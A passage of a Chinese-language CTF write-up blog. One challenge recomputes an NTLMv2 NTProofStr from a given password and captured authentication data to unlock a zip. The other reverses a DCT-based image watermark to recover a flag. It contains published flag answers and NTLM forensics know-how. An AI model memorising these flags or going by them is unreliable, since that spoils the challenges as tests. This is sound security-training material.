</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_name</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;QUICAUTH-CCC123!@#&#34;</span>
</span></span><span class=line><span class=cl><span class=n>domain_name</span> <span class=o>=</span> <span class=s2>&#34;SecretServer&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用MD4消息摘要算法得到16字节的 NTLM_HASH</span>
</span></span><span class=line><span class=cl><span class=n>ntlm_hash</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;md4&#34;</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;NTLM Hash: </span><span class=si>{</span><span class=n>ntlm_hash</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_domain_name</span> <span class=o>=</span> <span class=n>user_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span><span class=o>+</span><span class=n>domain_name</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;User Domain Data: </span><span class=si>{</span><span class=n>user_domain_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密</span>
</span></span><span class=line><span class=cl><span class=n>firstHMAC</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_hash</span><span class=p>),</span> <span class=n>user_domain_name</span><span class=p>,</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;First HMAC Result: </span><span class=si>{</span><span class=n>firstHMAC</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ntlm_authentication_data</span> <span class=o>=</span> <span class=s2>&#34;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NTproofstring</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>firstHMAC</span><span class=p>),</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ntlm_authentication_data</span><span class=p>),</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>NTproofstring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2</span>
</span></span><span class=line><span class=cl><span class=c1># User Domain Data: b&#39;A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74</span>
</span></span><span class=line><span class=cl><span class=c1># efa243f442b9d683eb1b00a2b1a0c9fc</span></span></span></code></pre></td></tr></table></div></div><p>把得到的 <code>NTproofstring</code> 作为压缩包解压密码解压即可得到最后的flag：<code>flag{8af4d019-98ae-4b4f-a4e9-97076d205fd2}</code></p><h2 class=heading-element id=题目名称-xxxxxx2022-dasctf-x-su-三月春季挑战赛><span>题目名称 xxxxxx（2022 DASCTF X SU 三月春季挑战赛）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-xxxxxx2022-dasctf-x-su-%e4%b8%89%e6%9c%88%e6%98%a5%e5%ad%a3%e6%8c%91%e6%88%98%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个 xxxxxx.bmp 和一个 xxxxxxEncrypt.py</p><p>xxxxxxEncrypt.py 内容如下，发现是经过混淆的 DCT 变换</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>xxxxxxx</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s1>&#39;xxxxxxx.bmp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxxxx</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s1>&#39;xxxxxxxx.bmp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxxxxx</span><span class=p>,</span> <span class=n>xxxxxxxxxx</span> <span class=o>=</span> <span class=n>xxxxxxx</span><span class=o>.</span><span class=n>shape</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxxxxxxx</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>xxxxxxxxx</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxxxxxxxx</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>xxxxxxxxxx</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fingernum</span> <span class=o>=</span> <span class=n>xxxxxxxx</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>xxxxxxxx</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>ceil</span><span class=p>(</span><span class=n>fingernum</span><span class=o>/</span><span class=p>(</span><span class=n>xxxxxxxxxxx</span><span class=o>*</span><span class=n>xxxxxxxxxxxx</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxxx</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>float32</span><span class=p>(</span><span class=n>xxxxxxx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xxxxxxxxxxxxx</span> <span class=o>=</span> <span class=n>xxxxxxx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>xxxxxxxxxxx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>xxxxxxxxxxxx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>xxxxxxxxxxxxxxx</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>dct</span><span class=p>(</span><span class=n>xxxxxxx</span><span class=p>[</span><span class=mi>8</span><span class=o>*</span><span class=n>i</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=o>*</span><span class=n>j</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>j</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=n>rx</span><span class=p>,</span> <span class=n>ry</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>			<span class=n>r1</span> <span class=o>=</span> <span class=n>xxxxxxxxxxxxxxx</span><span class=p>[</span><span class=n>rx</span><span class=p>,</span> <span class=n>ry</span><span class=p>]</span>
</span></span><span class=line><span class=cl>			<span class=n>r2</span> <span class=o>=</span> <span class=n>xxxxxxxxxxxxxxx</span><span class=p>[</span><span class=mi>7</span><span class=o>-</span><span class=n>rx</span><span class=p>,</span> <span class=mi>7</span><span class=o>-</span><span class=n>ry</span><span class=p>]</span>
</span></span><span class=line><span class=cl>			<span class=n>detat</span><span class=o>=</span><span class=nb>abs</span><span class=p>(</span><span class=n>r1</span><span class=o>-</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=n>xxxxxxxxxxxxxx</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>detat</span> <span class=o>+</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>xxxxxxxx</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=n>r1</span> <span class=o>&lt;=</span> <span class=n>r2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>					<span class=n>xxxxxxxxxxxxxxx</span><span class=p>[</span><span class=n>rx</span><span class=p>,</span> <span class=n>ry</span><span class=p>]</span> <span class=o>+=</span> <span class=n>xxxxxxxxxxxxxx</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>xxxxxxxx</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=mi>255</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=n>r1</span> <span class=o>&gt;=</span> <span class=n>r2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>					<span class=n>xxxxxxxxxxxxxxx</span><span class=p>[</span><span class=mi>7</span><span class=o>-</span><span class=n>rx</span><span class=p>,</span> <span class=mi>7</span><span class=o>-</span><span class=n>ry</span><span class=p>]</span> <span class=o>+=</span> <span class=n>xxxxxxxxxxxxxx</span>
</span></span><span class=line><span class=cl>		<span class=n>xxxxxxxxxxxxx</span><span class=p>[</span><span class=mi>8</span><span class=o>*</span><span class=n>i</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=o>*</span><span class=n>j</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>j</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>idct</span><span class=p>(</span><span class=n>xxxxxxxxxxxxxxx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=s2>&#34;xxxxxx.bmp&#34;</span><span class=p>,</span> <span class=n>xxxxxxxxxxxxx</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>因此我们需要先去混淆</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span><span class=o>,</span><span class=nn>math</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s1>&#39;xxxxxxx.bmp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s1>&#39;xxxxxxxx.bmp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>height</span><span class=p>,</span> <span class=n>width</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>shape</span>
</span></span><span class=line><span class=cl><span class=n>block_y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>height</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>block_x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>width</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fingernum</span> <span class=o>=</span> <span class=n>flag</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>flag</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>ceil</span><span class=p>(</span><span class=n>fingernum</span><span class=o>/</span><span class=p>(</span><span class=n>block_y</span><span class=o>*</span><span class=n>block_x</span><span class=p>))</span> <span class=c1># 返回大于等于参数fingernum/(x*y)的最小整数</span>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>float32</span><span class=p>(</span><span class=n>img</span><span class=p>)</span> <span class=c1># 转换为float类型，便于后续DCT变换</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_img</span> <span class=o>=</span> <span class=n>img</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>h</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>block_y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>w</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>block_x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data_dct</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>dct</span><span class=p>(</span><span class=n>img</span><span class=p>[</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>rx</span><span class=p>,</span> <span class=n>ry</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>            <span class=n>r1</span> <span class=o>=</span> <span class=n>data_dct</span><span class=p>[</span><span class=n>rx</span><span class=p>,</span> <span class=n>ry</span><span class=p>]</span> <span class=c1># 可以知道8格一块然后修改dct的3和4处数据</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span> <span class=o>=</span> <span class=n>data_dct</span><span class=p>[</span><span class=mi>7</span><span class=o>-</span><span class=n>rx</span><span class=p>,</span> <span class=mi>7</span><span class=o>-</span><span class=n>ry</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>detat</span><span class=o>=</span><span class=nb>abs</span><span class=p>(</span><span class=n>r1</span><span class=o>-</span><span class=n>r2</span><span class=p>)</span> <span class=c1># 绝对值</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>detat</span> <span class=o>+</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag</span><span class=p>[</span><span class=n>h</span><span class=p>][</span><span class=n>w</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r1</span> <span class=o>&lt;=</span> <span class=n>r2</span><span class=p>:</span> <span class=c1># 比较两边大小</span>
</span></span><span class=line><span class=cl>                    <span class=n>data_dct</span><span class=p>[</span><span class=n>rx</span><span class=p>,</span> <span class=n>ry</span><span class=p>]</span> <span class=o>+=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag</span><span class=p>[</span><span class=n>h</span><span class=p>][</span><span class=n>w</span><span class=p>]</span> <span class=o>==</span> <span class=mi>255</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r1</span> <span class=o>&gt;=</span> <span class=n>r2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>data_dct</span><span class=p>[</span><span class=mi>7</span><span class=o>-</span><span class=n>rx</span><span class=p>,</span> <span class=mi>7</span><span class=o>-</span><span class=n>ry</span><span class=p>]</span> <span class=o>+=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>        <span class=n>new_img</span><span class=p>[</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>idct</span><span class=p>(</span><span class=n>data_dct</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=s2>&#34;xxxxxx.bmp&#34;</span><span class=p>,</span> <span class=n>new_img</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>写个脚本提取数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span><span class=o>,</span><span class=nn>math</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util</span> <span class=kn>import</span> <span class=n>number</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s1>&#39;xxxxxx.bmp&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>height</span><span class=p>,</span> <span class=n>width</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>shape</span>
</span></span><span class=line><span class=cl><span class=n>block_y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>height</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>block_x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>width</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>float32</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>h</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>block_y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>w</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>block_x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data_dct</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>dct</span><span class=p>(</span><span class=n>img</span><span class=p>[</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>h</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=p>:</span><span class=mi>8</span><span class=o>*</span><span class=n>w</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>rx</span><span class=p>,</span> <span class=n>ry</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=n>r1</span> <span class=o>=</span> <span class=n>data_dct</span><span class=p>[</span><span class=n>rx</span><span class=p>,</span> <span class=n>ry</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span> <span class=o>=</span> <span class=n>data_dct</span><span class=p>[</span><span class=mi>7</span><span class=o>-</span><span class=n>rx</span><span class=p>,</span> <span class=mi>7</span><span class=o>-</span><span class=n>ry</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r1</span> <span class=o>&gt;</span> <span class=n>r2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>+=</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>提取出来的数据发现是一堆连续的0和1，尝试统计一下每组0和1的个数，发现刚刚好在ASCII码的范围内</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111110000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span></span></code></pre></td></tr></table></div></div><p>因此直接写个脚本统计并转ASCII即可得到最后的flag: <code>e25bd92141be945cfcdd1c65bb1b9375</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
